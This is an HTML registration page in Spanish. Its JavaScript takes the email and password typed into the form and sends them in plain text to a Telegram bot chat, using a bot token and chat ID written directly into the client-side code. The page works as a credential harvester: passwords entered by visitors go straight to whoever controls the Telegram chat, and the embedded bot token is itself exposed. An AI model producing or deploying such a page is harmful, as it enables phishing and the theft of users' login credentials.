<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Registro con Telegram</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .form-container {
      background: white;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
    }
    h2 {
      text-align: center;
      color: #4a90e2;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #4a90e2;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #357ab8;
    }
  </style>
</head>
<body>

<div class="form-container">
  <h2>Registrarse</h2>
  <form id="registroForm">
    <input type="email" id="email" placeholder="Correo electrónico" required>
    <input type="password" id="password" placeholder="Contraseña" required>
    <button type="submit">Registrar</button>
  </form>
</div>

<script>
  const TOKEN = '7539897662:AAFRDiLIC3G4NseVVdenitJPyrQV2RIugCw'; // Reemplaza con el token de tu bot
  const CHAT_ID = '8054031463'; // Reemplaza con tu chat_id

  document.getElementById('registroForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = `Nuevo registro:\nCorreo: ${email}\nContraseña: ${password}`;

    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    })
    .then(response => {
      if (response.ok) {
        alert('¡Registro enviado a Telegram!');
        document.getElementById('registroForm').reset();
      } else {
        alert('Error al enviar. Revisa el token o el chat ID.');
      }
    })
    .catch(error => {
      alert('Ocurrió un error de red. Verifica tu conexión o configuración.');
    });
  });
</script>

</body>
</html>
